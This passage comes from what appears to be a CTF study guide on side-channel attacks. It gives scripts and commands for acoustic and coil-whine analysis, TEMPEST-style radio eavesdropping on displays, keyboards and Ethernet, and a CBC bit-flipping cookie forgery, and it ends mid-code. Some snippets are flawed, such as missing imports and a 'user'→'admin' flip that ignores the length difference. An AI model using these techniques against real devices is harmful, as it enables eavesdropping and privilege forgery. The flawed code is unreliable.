[Inference] Based on published research (Genkin et al., "RSA Key Extraction via Low-Bandwidth Acoustic Cryptanalysis"), RSA operations produce distinguishable acoustic patterns during modular exponentiation:

```bash
# Isolate cryptographic operation timeframe
sox full_recording.wav rsa_operation.wav trim 10.5 0.8

# Focus on typical RSA frequency bands (3-5 kHz range)
sox rsa_operation.wav filtered_rsa.wav bandpass 4000 1000

# Correlation analysis to identify bit patterns
# Requires reference recordings of known operations
```

**Timing Correlation**

```python
#!/usr/bin/env python3
import numpy as np
from scipy import signal as sp_signal

def correlate_with_operations(audio_file, operation_log):
    """
    Correlate acoustic signatures with logged CPU operations
    operation_log: timestamps of cryptographic operations
    """
    sample_rate, audio = wav.read(audio_file)
    
    # Convert operation timestamps to audio sample indices
    for timestamp in operation_log:
        sample_idx = int(timestamp * sample_rate)
        window = audio[sample_idx:sample_idx + int(0.5 * sample_rate)]
        
        # Analyze frequency content during operation
        freqs, power = sp_signal.periodogram(window, sample_rate)
        dominant_freq = freqs[np.argmax(power)]
        
        print(f"Operation at {timestamp}s: Dominant frequency {dominant_freq:.2f} Hz")
```

**Machine Learning Classification**

```python
#!/usr/bin/env python3
from sklearn.ensemble import RandomForestClassifier
import numpy as np

# Feature extraction: MFCC (Mel-Frequency Cepstral Coefficients)
# Requires librosa
# apt-get install python3-librosa

import librosa

def extract_features(audio_file):
    audio, sr = librosa.load(audio_file, sr=96000)
    mfcc = librosa.feature.mfcc(y=audio, sr=sr, n_mfcc=13)
    return np.mean(mfcc, axis=1)

# Train classifier on known operation sounds
# [Inference] This requires labeled training data
# training_data = [(extract_features(f), label) for f, label in dataset]
# clf = RandomForestClassifier()
# clf.fit(X_train, y_train)
```

**Capture Hardware Considerations**

- **Smartphone microphones**: Sample rates typically 44.1-48 kHz, adequate for basic attacks
- **USB microphones**: 96 kHz capable, better frequency resolution
- **Ultrasonic microphones**: Required for frequencies >20 kHz
- **Contact microphones**: Attached directly to case for improved signal-to-noise ratio

**Distance and Environment**

[Unverified - based on published research claims] Attack effectiveness varies by distance:

- **<10cm**: High-fidelity key extraction possible with proper equipment
- **10cm-1m**: Detectable patterns with noise filtering
- **1-4m**: Requires multiple microphones and advanced signal processing
- **>4m**: Generally impractical without ideal conditions (silent room, sensitive equipment)

**Mitigation Detection**

```bash
# Check for acoustic countermeasures in target environment
# White noise generators produce flat spectrum

# Analyze for white noise
sox recording.wav -n stat 2>&1 | grep "RMS"

# Frequency flatness check
python3 << EOF
import numpy as np
import scipy.io.wavfile as wav

rate, data = wav.read('recording.wav')
freqs, power = np.fft.fftfreq(len(data), 1/rate), np.abs(np.fft.fft(data))
variance = np.var(power[power > np.mean(power)])
print(f"Frequency variance: {variance:.2e}")
# Low variance suggests white noise countermeasure
EOF
```

**Common CTF Scenarios**

- **Audio file analysis**: Provided recording contains CPU sounds during key generation
- **Operation identification**: Correlating acoustic patterns with specific algorithms (AES vs RSA)
- **Key bit extraction**: Distinguishing 0/1 bits in RSA operations through timing patterns
- **Covert channels**: CPU intentionally modulated to transmit data acoustically

**Tools and Frameworks**

```bash
# GNU Radio for advanced signal processing
apt-get install gnuradio

# Audacity for manual spectrogram analysis
apt-get install audacity

# rtl-sdr for radio frequency analysis (if acoustic emissions modulate RF)
apt-get install rtl-sdr
```

---

### Coil Whine Exploitation

Coil whine is acoustic noise produced by inductors (coils) and transformers in power delivery circuits. Unlike general CPU sounds, coil whine specifically originates from magnetostriction and electrostriction effects in magnetic components. The frequency and amplitude directly correlate with current draw patterns, making it a precise side-channel for monitoring computational load.

**Physical Mechanism**

Coil whine occurs when:

- **Magnetostriction**: Ferromagnetic core materials physically expand/contract under magnetic field changes
- **Electrostriction**: Ceramic capacitors vibrate due to electric field variations
- **Switching frequency modulation**: PWM (Pulse Width Modulation) controllers operate at frequencies (20 kHz - 1 MHz) that produce audible harmonics

[Inference] Graphics cards and voltage regulators are primary sources due to rapid load changes during rendering or intensive computation.

**Identification and Isolation**

```bash
# Capture high-frequency audio (coil whine often 15-25 kHz)
arecord -f S32_LE -r 192000 -c 1 -d 30 coil_whine.wav

# Isolate coil whine frequency band
sox coil_whine.wav isolated.wav bandpass 18000 4000

# High-pass filter to remove CPU noise
sox coil_whine.wav hp_filtered.wav highpass 15000
```

**Frequency Analysis**

```python
#!/usr/bin/env python3
import numpy as np
import scipy.io.wavfile as wav
import scipy.signal as signal

def analyze_coil_whine(audio_file, target_freq_range=(15000, 25000)):
    """
    Focus on coil whine specific frequency range
    """
    sample_rate, audio = wav.read(audio_file)
    
    # Bandpass filter for coil whine frequencies
    sos = signal.butter(10, target_freq_range, 'bandpass', fs=sample_rate, output='sos')
    filtered = signal.sosfilt(sos, audio)
    
    # Compute instantaneous power
    analytic_signal = signal.hilbert(filtered)
    amplitude_envelope = np.abs(analytic_signal)
    
    # Detect power variations (correlate with operations)
    return amplitude_envelope

# Load and analyze
envelope = analyze_coil_whine('coil_whine.wav')

# Identify computation events by power spikes
threshold = np.mean(envelope) + 2 * np.std(envelope)
events = np.where(envelope > threshold)[0]
print(f"Detected {len(events)} high-power events")
```

**Load Pattern Correlation**

```python
#!/usr/bin/env python3
import numpy as np
from scipy.stats import pearsonr

def correlate_load_patterns(audio_file, instruction_trace):
    """
    Correlate coil whine amplitude with known instruction execution
    instruction_trace: dict of {timestamp: instruction_type}
    """
    sample_rate, audio = wav.read(audio_file)
    envelope = analyze_coil_whine(audio_file)
    
    # Downsample envelope to match instruction trace resolution
    window_size = int(sample_rate * 0.001)  # 1ms windows
    downsampled = np.array([np.mean(envelope[i:i+window_size]) 
                            for i in range(0, len(envelope), window_size)])
    
    # Create load vector from instructions
    load_vector = []
    for ts in sorted(instruction_trace.keys()):
        # [Inference] Heavy operations (MUL, AES) = 1, light operations = 0
        load_vector.append(1 if instruction_trace[ts] in ['MUL', 'AES', 'XOR'] else 0)
    
    # Compute correlation
    correlation, p_value = pearsonr(downsampled[:len(load_vector)], load_vector)
    print(f"Correlation: {correlation:.3f}, p-value: {p_value:.3e}")
    
    return correlation > 0.5  # Significant correlation threshold
```

**GPU Coil Whine Analysis**

[Inference] GPUs produce distinct coil whine patterns during different workloads (rendering vs compute):

```bash
# Capture during suspected GPU cryptographic operation
arecord -f S32_LE -r 192000 -c 1 -d 10 gpu_coil.wav

# GPU coil whine typically higher frequency (20-40 kHz)
sox gpu_coil.wav gpu_isolated.wav bandpass 25000 10000
```

**Identifying Cryptographic Operations**

```python
#!/usr/bin/env python3
def detect_crypto_operations(audio_file):
    """
    Cryptographic operations show periodic patterns in coil whine
    AES rounds produce regular amplitude modulation
    """
    envelope = analyze_coil_whine(audio_file)
    
    # Autocorrelation to detect periodicity
    autocorr = np.correlate(envelope, envelope, mode='full')
    autocorr = autocorr[len(autocorr)//2:]
    
    # Find peaks (periodic intervals)
    peaks, _ = signal.find_peaks(autocorr, height=np.max(autocorr)*0.5)
    
    if len(peaks) > 10:  # Significant periodicity
        period = np.mean(np.diff(peaks[:10]))
        print(f"Detected periodic operation with period: {period} samples")
        
        # [Inference] AES-128: 10 rounds, RSA: irregular pattern
        if 9 <= len(peaks) <= 11:
            print("[Inference] Possible AES encryption (10 rounds)")
        elif len(peaks) > 50:
            print("[Inference] Possible RSA operation (many multiplications)")
    
    return peaks
```

**Power Analysis Correlation**

Coil whine amplitude correlates with instantaneous current draw, making it analogous to power analysis:

```python
#!/usr/bin/env python3
def simulate_power_trace(coil_whine_envelope, calibration_factor=1.0):
    """
    Convert coil whine amplitude to approximate power consumption
    [Inference] Requires calibration with actual power measurements
    """
    # Normalize envelope
    normalized = (coil_whine_envelope - np.min(coil_whine_envelope))
    normalized = normalized / np.max(normalized)
    
    # Apply calibration (example: 5W idle + 50W range)
    power_estimate = 5.0 + (normalized * 50.0 * calibration_factor)
    
    return power_estimate

# Use like traditional power analysis
# Differential analysis possible if multiple traces available
```

**Distinguishing Coil Whine from Other Sounds**

```python
#!/usr/bin/env python3
def classify_acoustic_source(audio_file):
    """
    Distinguish coil whine from CPU/fan/HDD noise
    """
    sample_rate, audio = wav.read(audio_file)
    
    # Compute FFT
    fft = np.fft.fft(audio)
    freqs = np.fft.fftfreq(len(audio), 1/sample_rate)
    magnitude = np.abs(fft)
    
    # Analyze frequency distribution
    low_freq_power = np.sum(magnitude[(freqs > 100) & (freqs < 5000)])
    mid_freq_power = np.sum(magnitude[(freqs > 5000) & (freqs < 15000)])
    high_freq_power = np.sum(magnitude[(freqs > 15000) & (freqs < 30000)])
    
    total_power = low_freq_power + mid_freq_power + high_freq_power
    
    # [Inference] Classification based on frequency distribution
    if high_freq_power / total_power > 0.6:
        return "COIL_WHINE"
    elif mid_freq_power / total_power > 0.5:
        return "CPU_ACOUSTIC"
    elif low_freq_power / total_power > 0.6:
        return "FAN_NOISE"
    else:
        return "MIXED_SOURCES"
```

**CTF Challenge Patterns**

**Pattern 1: Flag Hidden in Modulation**

```python
#!/usr/bin/env python3
def extract_modulated_data(audio_file):
    """
    Data may be encoded in amplitude or frequency modulation of coil whine
    """
    envelope = analyze_coil_whine(audio_file)
    
    # Amplitude Shift Keying (ASK) detection
    threshold = np.median(envelope)
    binary = (envelope > threshold).astype(int)
    
    # Group into bytes
    bits = ''.join(map(str, binary[:-(len(binary) % 8)]))
    bytes_data = [int(bits[i:i+8], 2) for i in range(0, len(bits), 8)]
    
    # Attempt ASCII decode
    try:
        flag = ''.join(chr(b) for b in bytes_data if 32 <= b <= 126)
        print(f"Decoded: {flag}")
    except:
        print("Binary data:", bytes_data[:20])
    
    return binary
```

**Pattern 2: Timing-Based Side Channel**

```python
#!/usr/bin/env python3
def timing_analysis(audio_file, sample_operations):
    """
    Measure operation duration through coil whine presence
    Similar to timing attacks on cryptographic implementations
    """
    envelope = analyze_coil_whine(audio_file)
    
    # Detect operation start/end by amplitude thresholds
    active_threshold = np.percentile(envelope, 75)
    active_regions = envelope > active_threshold
    
    # Measure durations
    durations = []
    in_operation = False
    start_idx = 0
    
    for i, active in enumerate(active_regions):
        if active and not in_operation:
            start_idx = i
            in_operation = True
        elif not active and in_operation:
            durations.append(i - start_idx)
            in_operation = False
    
    print(f"Detected {len(durations)} operations")
    print(f"Duration statistics: mean={np.mean(durations):.1f}, std={np.std(durations):.1f}")
    
    return durations
```

**Capture Hardware Recommendations**

- **High sample rate required**: Minimum 96 kHz, preferably 192 kHz for frequencies >20 kHz
- **Low-noise microphone**: Condenser microphones with flat frequency response
- **Contact microphone placement**: Directly on GPU backplate or VRM heatsink for strongest signal
- **Shielded environment**: Minimize background noise for low-amplitude signals

**Environmental Considerations**

[Inference] Coil whine amplitude varies with:

- **Load level**: Higher GPU/CPU utilization = louder coil whine
- **Component quality**: Cheaper inductors and capacitors produce more noise
- **Age**: Worn components may exhibit increased coil whine
- **Temperature**: Some components are temperature-sensitive

**Defense Detection**

```bash
# Check for acoustic countermeasures
# Ultrasonic jammers produce constant high-frequency noise

# Detect jammer presence (constant high-frequency power)
python3 << EOF
import numpy as np
import scipy.io.wavfile as wav

rate, data = wav.read('recording.wav')
fft = np.fft.fft(data)
freqs = np.fft.fftfreq(len(data), 1/rate)

# Check for constant power in ultrasonic range
ultrasonic = np.abs(fft[(freqs > 20000) & (freqs < 40000)])
if np.std(ultrasonic) < np.mean(ultrasonic) * 0.1:
    print("[Warning] Possible ultrasonic jammer detected")
EOF
```

**Related Tools**

```bash
# Spectrum analyzer for real-time frequency analysis
apt-get install baudline

# Launch baudline with high sample rate support
baudline -samplerate 192000 -channels 1 -stdin < /dev/stdin &
arecord -f S32_LE -r 192000 -c 1 | baudline -stdin

# Universal Radio Hacker for signal analysis
apt-get install urh
```

**Important CTF Considerations**

When provided audio files in CTF challenges:

1. **Check metadata**: Sample rate, duration, recording device (may contain hints)
2. **Visual inspection**: Open in Audacity to identify obvious patterns
3. **Frequency sweep**: Analyze full spectrum, not just audible range
4. **Multiple demodulation attempts**: Try AM, FM, ASK, FSK decoding
5. **Correlation with timestamps**: If challenge provides operation logs, correlate timing

**Disclaimer**

[Unverified] The effectiveness of acoustic attacks depends heavily on physical setup, hardware characteristics, and environmental conditions. Published research demonstrates proof-of-concept attacks; real-world exploitation requires specialized equipment and controlled conditions. CTF challenges typically provide pre-recorded audio files where these variables are controlled.

---

## Electromagnetic Analysis

### EMI/EMF Emissions

#### Electromagnetic Emission Fundamentals

**Physical basis:**

- All electronic devices emit electromagnetic radiation during operation
- Digital circuits create EM emissions at clock frequencies and harmonics
- Data-dependent variations in emissions leak information about processed data
- Emission frequency ranges: kHz to GHz depending on circuit speed

**Emission sources in computing devices:**

- CPU operations: Varies with instruction types and data values
- Memory access: DRAM refresh cycles, cache hits/misses
- Display systems: Video signals, refresh rates (CRT especially vulnerable)
- Power supply circuits: Switching regulators, voltage variations
- Communication buses: USB, PCIe, SATA, network interfaces
- Cryptographic coprocessors: Key-dependent power consumption patterns

#### Measurement Equipment

**Basic spectrum analysis:**

```bash
# Software Defined Radio (SDR) setup with RTL-SDR
# Install required tools on Kali
apt-get install rtl-sdr gqrx-sdr inspectrum

# Test RTL-SDR device
rtl_test -t

# Scan frequency range
rtl_power -f 88M:108M:8k -g 50 -i 10 scan.csv

# Real-time spectrum view
gqrx
```

**Hardware requirements for serious analysis:**

- **Oscilloscopes**: Digital storage oscilloscope (DSO) with >100 MHz bandwidth
- **Spectrum analyzers**: 9 kHz - 3 GHz minimum range for TEMPEST
- **Near-field probes**: H-field and E-field probes for localized emissions
- **Antennas**: Broadband antennas (log-periodic, biconical) for far-field measurement
- **LNAs**: Low-noise amplifiers for weak signal detection
- **Shielded enclosures**: Faraday cages for baseline measurements

**Software tools:**

```bash
# GNU Radio for SDR signal processing
apt-get install gnuradio

# Universal Radio Hacker (URH)
apt-get install urh

# Inspectrum for waterfall analysis
inspectrum capture.ciq  # Complex IQ file

# Custom Python with PySDR
pip3 install pyrtlsdr numpy scipy matplotlib
```

#### Emission Measurement Methodology

**Site survey and baseline:**

```bash
# Scan for ambient RF noise
rtl_power -f 24M:1800M:1M -g 50 -i 60 baseline.csv

# Analyze with Python
python3 << EOF
import numpy as np
import matplotlib.pyplot as plt

data = np.loadtxt('baseline.csv', delimiter=',', usecols=(2,6))
plt.plot(data[:,0], data[:,1])
plt.xlabel('Frequency (Hz)')
plt.ylabel('Power (dB)')
plt.savefig('baseline_spectrum.png')
EOF
```

**Target isolation:**

- Power down all devices except target
- Shield or distance other EM sources
- Use directional antennas to isolate target emissions
- Multiple measurement positions to identify emission source location

**Near-field vs far-field measurements:**

- **Near-field** (< λ/2π from source): Direct coupling, higher signal strength
    - Use: Small magnetic/electric field probes
    - Range: Typically 0-30 cm from PCB traces
- **Far-field** (> 2λ from source): Propagating waves
    - Use: Standard antennas
    - Range: Meters to kilometers depending on power

**Frequency analysis:**

```bash
# Record IQ samples with HackRF
hackrf_transfer -r capture.iq -f 100000000 -s 20000000 -n 200000000

# Record with RTL-SDR
rtl_sdr -f 100e6 -s 2.4e6 -n 10000000 capture.bin

# Convert to formats for analysis
# Use inspectrum or custom GNU Radio flowgraphs
```

#### Side-Channel Leakage Patterns

**Data-dependent emissions:**

- Hamming weight leakage: EM emissions correlate with number of bits transitioning
- Instruction-dependent patterns: Different opcodes produce distinct EM signatures
- Memory access patterns: Cache hits vs misses show different emission characteristics

**Clock harmonics:**

- Primary emissions at CPU clock frequency and integer multiples
- Modulation sidebands contain data-dependent information
- Example: 2 GHz CPU shows peaks at 2 GHz, 4 GHz, 6 GHz, etc.

**Differential emissions analysis:**

```python
# Conceptual Python for correlation analysis
import numpy as np
from scipy.stats import pearsonr

# traces: array of EM measurements (n_traces, n_samples)
# data: array of processed data values (n_traces,)

def hamming_weight(x):
    return bin(x).count('1')

# Calculate correlation between emissions and Hamming weight
hw = np.array([hamming_weight(d) for d in data])
correlations = np.zeros(traces.shape[1])

for i in range(traces.shape[1]):
    correlations[i], _ = pearsonr(traces[:, i], hw)

# Peak correlation indicates leakage point
peak_sample = np.argmax(np.abs(correlations))
```

#### Cryptographic Key Extraction

**Simple Power Analysis (SPA):**

- Single trace reveals operation sequence
- Vulnerable operations: RSA square-and-multiply, conditional branches
- EM equivalent: Single emission trace shows algorithm flow

**Differential Power Analysis (DPA) / Differential EM Analysis (DEMA):**

- Statistical analysis across multiple traces
- Correlates hypothetical intermediate values with measured emissions
- Typically requires 100-10,000+ traces depending on noise

**Key extraction framework (ChipWhisperer):**

```bash
# ChipWhisperer installation (if hardware available)
git clone https://github.com/newaetech/chipwhisperer
cd chipwhisperer
python setup.py develop

# [Unverified] Example attack script structure
python3 << 'EOF'
import chipwhisperer as cw
import numpy as np

# Setup scope and target (hardware specific)
scope = cw.scope()
target = cw.target(scope)

# Capture traces
traces = []
plaintexts = []
for i in range(1000):
    plaintext = np.random.randint(0, 256, 16)
    scope.arm()
    target.simpleserial_write('p', plaintext)
    ret = scope.capture()
    trace = scope.get_last_trace()
    traces.append(trace)
    plaintexts.append(plaintext)

# Perform correlation analysis
# (requires additional attack scripts specific to algorithm)
EOF
```

**Template attacks:**

- Build emission templates during profiling phase
- Match unknown traces to templates for key recovery
- Requires identical or similar device for profiling
- [Inference] Higher success rate than DPA but requires more preparation

#### EM Probing Techniques

**Probe types and placement:**

**Magnetic field (H-field) probes:**

- Sense magnetic fields around current-carrying conductors
- Best for: Power lines, clock traces, bus signals
- Construction: Small wire loops (1-10 mm diameter)

```bash
# DIY H-field probe
# Materials: Semi-rigid coax, SMA connector
# Loop diameter: 3mm for localized, 10mm for general scanning
```

**Electric field (E-field) probes:**

- Sense voltage fluctuations
- Best for: IC pins, high-impedance nodes
- Construction: Short monopole or stub antenna

**Probe positioning:**

- Scan systematically across PCB surface
- Focus on: CPU package, crypto accelerator, memory chips
- Distance: 1-5 mm for near-field, avoid contact
- Document x-y grid positions for spatial correlation

**Probe amplification:**

```bash
# Use low-noise amplifier (LNA) between probe and SDR
# Typical gain: 20-40 dB
# Example: Mini-Circuits ZX60-P103LN+ (0.5-3 GHz, 23 dB gain)

# Connect: Probe -> LNA -> Bandpass filter -> SDR/Scope
```

#### Emission Reduction and Countermeasure Detection

**Shielding effectiveness testing:**

- Measure emissions before and after shielding
- Calculate shielding effectiveness (SE) in dB: SE = 20 log₁₀(E₁/E₂)
- Test multiple frequencies to identify gaps

**Spread spectrum clocking:**

- Clock frequency varies slightly to spread emission energy
- Detection: Broadened spectral peaks instead of sharp lines
- Reduces peak emissions but total energy remains constant

**Randomization and masking:**

- Operation timing randomization (dummy operations, random delays)
- Data masking: XOR data with random values
- Detection: Increased noise floor, reduced correlation in DPA

**Filtering and decoupling:**

- Power supply filtering reduces conducted emissions
- Decoupling capacitors on PCB reduce high-frequency transients
- Detection: Cleaner power supply spectrum, reduced harmonics

### Tempest Attacks (Passive Eavesdropping)

#### TEMPEST Background

**Definition and scope:**

- TEMPEST: NSA codename for investigating compromising emanations
- Compromising Emanations (CE): Unintentional signals that leak classified information
- Scope: Video displays, keyboards, printers, network cables, entire systems

**Historical context:**

- Declassified in 1999-2000 (NACSIM 5000 series, NATO SDIP-27)
- First public demonstration: Van Eck phreaking (1985)
- Standards: NATO SDIP-27 (Zones: 20m, 100m for different classification levels)

**Legal considerations:**

- [Unverified] Passive reception legality varies by jurisdiction
- Active transmissions require licensing
- Research typically conducted in shielded lab environments

#### Video Display Emanations

**CRT (Cathode Ray Tube) displays:**

- Strongest TEMPEST vulnerability due to high voltages and scanning mechanism
- Emissions at horizontal scan frequency (~15-30 kHz for VGA) and harmonics
- Vertical refresh rate (50-100 Hz) modulates the signal
- Reconstruction possible at significant distances (100+ meters reported in literature)

**LCD/LED displays:**

- Lower emissions than CRT but still vulnerable
- Leakage sources: LVDS/eDP cables, timing controller, backlight inverters
- Digital interface emissions (DVI/HDMI) radiate unencrypted pixel data
- Typical range: [Inference] Significantly shorter than CRT, likely 1-20 meters

**VGA cable radiation:**

- Unshielded VGA cables act as antennas
- Each RGB channel radiates at video bandwidth (~25-200 MHz)
- Differential mode emissions from twisted pairs
- Common mode emissions from cable shield currents

#### Video Signal Reconstruction

**TempestSDR (open-source TEMPEST implementation):**

```bash
# Install TempestSDR
git clone https://github.com/martinmarinov/TempestSDR
cd TempestSDR
# Follow build instructions (requires Qt, SDR drivers)

# [Unverified] Basic usage concept
# 1. Tune SDR to likely emission frequency (400-900 MHz common range)
# 2. Adjust bandwidth to match video signal
# 3. Synchronize to horizontal/vertical timing
# 4. Demodulate and reconstruct image
```

**Van Eck Phreaking methodology:**

**Step 1: Frequency identification**

```bash
# Scan for video-related emissions
rtl_power -f 400M:900M:1M -g 50 -i 10 video_scan.csv

# Look for periodic patterns matching refresh rate
# VGA: Look for harmonics of 31.5 kHz (horizontal) and 60-75 Hz (vertical)
```

**Step 2: Signal isolation**

```bash
# Capture signal at identified frequency
hackrf_transfer -r vga_capture.iq -f 485000000 -s 20000000 -n 400000000

# Use directional antenna pointed at target display
```

**Step 3: Signal processing**

- Synchronization: Detect horizontal and vertical sync pulses
- Demodulation: AM/FM demodulation depending on emission mode
- Image reconstruction: Map samples to pixel positions
- Enhancement: Noise reduction, frame averaging, geometric correction

**Resolution and quality factors:**

- Distance to target: Inverse square law for far-field
- Antenna gain and directivity: Higher gain improves range
- Background RF noise: Urban environments more challenging
- Display resolution: Higher resolutions spread energy, harder to recover
- Video content: High contrast text easier than complex images

#### Keyboard Emanations

**Keystroke timing attacks:**

- Each key press creates unique EM signature
- Timing variations between keystrokes reveal information
- Broadcast protocols (wireless keyboards) especially vulnerable

**Wired keyboard emissions:**

- PS/2: Serial protocol emissions at ~10-16 kHz clock
- USB: 1.5 Mbps (Low Speed) or 12 Mbps (Full Speed) data rate emissions
- Scan code patterns correlate with specific keys

**Detection methodology:**

```bash
# Record during typing session
rtl_sdr -f 100e6 -s 2.4e6 capture_keyboard.bin

# Analyze for periodic patterns
# Each keystroke shows as burst in time-domain
# Timing analysis can cluster similar keys
```

**Wireless keyboard interception:**

```bash
# Many wireless keyboards use unencrypted protocols
# Use SDR to capture 27 MHz or 2.4 GHz transmissions

# nRF24 sniffing (for Nordic Semiconductor based keyboards)
git clone https://github.com/BastilleResearch/nrf-research-firmware
# Flash to Crazyradio PA or compatible device
# Use Mousejack tools for packet capture

# [Unverified] Some keyboards use proprietary encryption
```

**Statistical keystroke analysis:**

- Build database of EM signatures for each key
- Compare unknown keystrokes to database
- N-gram analysis improves accuracy using language patterns
- Reported accuracy: [Unverified] 80-95% for trained systems in controlled environments

#### Network Cable Emanations

**Ethernet cable radiation:**

- Differential mode: Signals on twisted pairs
- Common mode: Currents on cable shield
- Data rate dependent: 100 Mbps easier than 1 Gbps due to bandwidth
- Unshielded cables radiate more than shielded (STP/FTP)

**Eavesdropping on Ethernet:**

```bash
# Frequency range: Typically 30-300 MHz for 100BaseT
# Higher for Gigabit Ethernet

# Capture with SDR
hackrf_transfer -r ethernet_capture.iq -f 125000000 -s 20000000

# Demodulation requires:
# - Manchester/4B5B encoding knowledge (100BaseT)
# - 8B10B encoding knowledge (1000BaseT)
# - Proper clock recovery
# - Symbol timing synchronization
```

**Fiber optic cables:**

- Optical fibers do not emit EM radiation during normal operation
- Potential leakage at: Transceivers, patch panels, connectors
- Physical access attacks: Fiber bending (microbend sensors)
- [Inference] Significantly more secure against EM eavesdropping than copper

#### Audio Reconstruction

**Speaker and microphone emanations:**

- Speakers: Audio signals modulate power supply current
- Microphones: Preamplifier emissions correlate with audio
- Headphones: Cable emissions at audio frequencies

**HDMI audio extraction:**

- HDMI carries both video and audio digitally
- TMDS (Transition Minimized Differential Signaling) emissions
- Audio may be easier to reconstruct than video due to lower bandwidth

**Acoustic cryptanalysis:**

- Not purely EM, but related side-channel
- CPU operations create acoustic emissions
- RSA key extraction demonstrated via microphone (4096-bit in <1 hour)
- EM equivalent: Correlating EM with acoustic signatures

#### Printer and Peripheral Emanations

**Laser printer emanations:**

- Stepper motor timing reveals printed patterns
- High voltage modulation for toner attraction
- [Unverified] Page reconstruction potentially possible from EM analysis

**Dot matrix printer tracking:**

- Print head movement creates strong EM signatures
- Each character has unique emission pattern
- Reconstruction demonstrated in academic research

**Machine ID watermarks:**

- Not EM-based, but related to printer forensics
- Yellow dot tracking patterns on color laser printers
- Encodes: Serial number, date/time
- Detection: Blue light illumination, magnification

#### TEMPEST Countermeasures

**Emission security (EMSEC) zones:**

- Zone 0: No protection (public areas)
- Zone 1: 20 meters protection (NATO RED equipment)
- Zone 2: 100 meters protection (higher classifications)
- Zone 3: 1 kilometer+ (extremely sensitive)

**Physical shielding:**

**Faraday cage construction:**

- Conductive enclosure: Copper mesh, steel, aluminum
- All six sides must be conductive and connected
- Gaps and seams < λ/10 at highest frequency of concern
- Doors and access points: Conductive gaskets, RF contact strips

**Effectiveness testing:**

```bash
# Place transmitter inside cage
# Measure signal strength outside vs inside
# Calculate shielding effectiveness (SE)

# SE (dB) = 20 log₁₀(E_without / E_with)
# Good cage: 60-100+ dB attenuation
```

**Filtered power and data:**

- Power line filters: LC filters on mains input
- Data line filters: Common mode chokes, ferrite beads
- Fiber optic isolation: No EM coupling between zones

**TEMPEST-rated equipment:**

- Commercial: NATO approved, NSTISSAM/1-92 compliant
- Features: Internal shielding, filtered interfaces, emission suppression
- Certification levels: Level I (zone 1), Level II (zone 2), Level III (laboratory)

**Red/Black separation:**

- RED: Unencrypted classified information
- BLACK: Encrypted information
- Physical separation: Minimum distances, shielded barriers
- Typical separation: [Unverified] 1 meter for RED equipment, varies by classification

#### Detection and Attribution Evasion

**Passive nature advantages:**

- No active signals transmitted (hard to detect eavesdropping)
- RF detection equipment only shows background emissions
- Legal ambiguity in many jurisdictions for passive reception

**Counter-surveillance detection:**

- Spectrum analyzers to detect eavesdropping equipment
- Time-domain reflectometry (TDR) on cables
- Physical security: Visual inspection for antennas, SDRs
- [Inference] Detection of passive eavesdropping is very difficult without physical access

**Transmission security (TRANSEC) vs EMSEC:**

- TRANSEC: Prevents interception of intentional transmissions
- EMSEC: Prevents interception of unintentional emissions
- Both required for comprehensive security

#### Practical CTF Scenarios

**Challenge examples:**

**Scenario 1: VGA signal recovery**

- Provided: IQ recording from SDR near target display
- Goal: Reconstruct displayed text (flag)
- Tools: TempestSDR, GNU Radio, custom demodulation scripts

**Scenario 2: Keyboard timing analysis**

- Provided: EM trace recording during password entry
- Goal: Recover password from timing patterns
- Approach: Template matching, statistical analysis

**Scenario 3: Ethernet eavesdropping**

- Provided: EM recording from network cable vicinity
- Goal: Extract transmitted packets
- Challenge: Clock recovery, Manchester decoding, FCS validation

**Analysis workflow:**

```bash
# 1. Identify signal type
inspectrum capture.iq  # Visual inspection of waterfall

# 2. Determine modulation and timing
# Look for: Periodic patterns, sync pulses, data bursts

# 3. Extract symbols
# GNU Radio flowgraph or Python script

# 4. Decode protocol
# Apply known encoding (Manchester, 8B10B, etc.)

# 5. Reconstruct data
# Image reconstruction, packet assembly, keystroke timing
```

#### Advanced Research Topics

**Multi-channel analysis:**

- Simultaneously capture multiple frequency bands
- Correlate emissions from different sources
- Build spatial emission map of target device

**Machine learning for emission classification:**

- Train classifier on known emissions
- Automate signal identification and decoding
- [Unverified] Neural networks show promise for noisy signal recovery

**Quantum TEMPEST:**

- [Speculation] Quantum computers may have unique emission signatures
- Superconducting qubit control signals may be vulnerable
- No confirmed research on practical quantum TEMPEST attacks

---

**Important related topics for comprehensive electromagnetic analysis:**

- Fault injection via electromagnetic pulses (EM-FI)
- Power analysis (SPA/DPA) correlation with EM analysis
- RF protocol analysis and reverse engineering
- Hardware implants and detection techniques
- Software-defined radio (SDR) advanced signal processing

---

## Fault Injection

Fault injection attacks deliberately introduce errors into cryptographic operations to bypass security mechanisms, extract secrets, or alter execution flow. These physical and semi-physical attacks target the hardware layer during computation.

### Bit Flipping Attacks

Bit flipping manipulates individual bits in memory, storage, or during transmission to alter cryptographic operations, authentication tokens, or program logic.

**Attack Categories**

**1. Cryptographic Bit Flipping (CBC Mode)**

CBC mode encryption is vulnerable to bit flipping because ciphertext blocks XOR with plaintext during decryption. Flipping bits in ciphertext block N affects the plaintext of block N+1 predictably.

```python
# CBC bit flipping attack structure
# Ciphertext: C1 | C2 | C3
# Decryption: P2 = D(C2) XOR C1

# To flip bit in position X of P2:
# Flip bit X in C1
# P2' = D(C2) XOR C1' where C1' has bit X flipped

# Example: Change "user=guest" to "user=admin"
original = b"user=guest"
target = b"user=admin"

# XOR difference
diff = bytes([a ^ b for a, b in zip(original, target)])

# Apply to previous ciphertext block
modified_ciphertext_block = bytes([a ^ b for a, b in zip(ciphertext_block, diff)])
```

**CTF Implementation Example**

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

# Simulate encrypted cookie: "role=user;uid=1000"
# Goal: Change to "role=admin"

def encrypt_cookie(plaintext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(plaintext.encode(), 16))

def decrypt_cookie(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), 16).decode()

# Attack
key = os.urandom(16)
iv = os.urandom(16)

original_plaintext = "role=user;uid=1000"
ciphertext = encrypt_cookie(original_plaintext, key, iv)

# Identify block positions
# Block 0 (IV): affects Block 1 plaintext
# Block 1: "role=user;uid=10"
# We want to flip bits to change "user" to "admin"

# Position calculation
target_position = 5  # Position of 'u' in "user"
original_byte = ord('u')
target_byte = ord('a')
flip_mask = original_byte ^ target_byte

# Modify IV (affects first plaintext block)
modified_iv = bytearray(iv)
modified_iv[target_position] ^= flip_mask

# Continue for other characters
for i, (orig_char, target_char) in enumerate([('s','d'), ('e','m'), ('r','i')]):
    pos = target_position + 1 + i
